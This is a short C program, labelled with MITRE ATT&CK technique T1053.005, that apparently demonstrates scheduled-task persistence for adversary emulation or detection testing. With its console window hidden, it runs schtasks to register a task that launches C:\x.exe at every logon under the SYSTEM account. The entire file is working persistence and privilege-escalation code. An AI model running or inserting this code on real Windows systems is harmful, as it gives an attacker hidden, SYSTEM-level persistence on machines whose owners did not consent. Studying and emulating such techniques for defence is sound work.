// Link      = https://attack.mitre.org/techniques/T1053/005/
// Technique = Scheduled Task/Job: Scheduled Task
// ID        = T1053.005
// Tactics   = Execution, Persistence, Privilege Escalation,

#include <windows.h>

#define RUN(to_run) ShellExecuteA(NULL,"open","cmd.exe",to_run ,NULL,SW_HIDE);

int main() {
    RUN("schtasks /create /tn \"abc\" /tr C:\\x.exe /sc ONLOGON /ru \"System\"");
    return 0;
}